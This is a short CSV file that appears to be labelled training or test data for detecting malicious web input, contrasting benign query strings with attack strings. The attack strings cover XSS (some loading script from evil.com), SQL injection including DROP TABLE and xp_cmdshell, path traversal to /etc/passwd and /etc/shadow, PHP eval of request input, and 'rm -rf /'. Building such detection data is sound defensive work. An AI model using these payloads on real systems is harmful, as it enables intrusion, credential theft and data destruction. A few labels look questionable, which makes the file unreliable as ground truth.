text,label
id=1&name=test,0
hello world,0
search=test,0
login.php?q=test,0
user=admin&pass=123,0
post=example&comment=ok,0
index.php?page=home,0
page=contact&lang=en,0
action=submit&token=abcd,0
profile.php?id=42,0
dashboard.php,0
sort=asc&filter=active,0
newsletter=subscribe,0
product?id=10&view=full,0
category=books&sort=price,0

<script>alert(1)</script>,1
' OR 1=1 --,1
UNION SELECT password FROM users,1
../../etc/passwd,1
onerror=alert(1),1
<img src=x onerror=alert(1)>,1
../config.php,1
exec(cmd),1
SELECT * FROM users WHERE id=1,1
`rm -rf /`,1
'; DROP TABLE users; --,1
<iframe src=evil.com>,1
<script>document.cookie</script>,1
" OR ""=",1
../../../../etc/shadow,1
system('ls'),1
load_file('/etc/passwd'),1
<svg onload=alert(1)>,1
<math><mi>x</mi><mn>1</mn><mo>=</mo><mtext></mtext></math>,1
eval($_GET['cmd']),1
<?=phpinfo()?>,1
../../secret/config.yaml,1
<OBJECT TYPE="text/x-scriptlet" DATA="http://evil.com/xss.js">,1
<video><source onerror=alert(1)></video>,1
/../../../../var/log/apache2/access.log,1
<script src=http://evil.com/x.js></script>,1
<IMG SRC=javascrip:alert('XSS')>,1
../../backup/.htpasswd,1
alert(document.domain),1
"SELECT username, password FROM users",1
'; EXEC xp_cmdshell('dir'); --,1
../../db/mysql.cnf,1
<base href="http://evil.com/"><script>alert(1)</script>,1
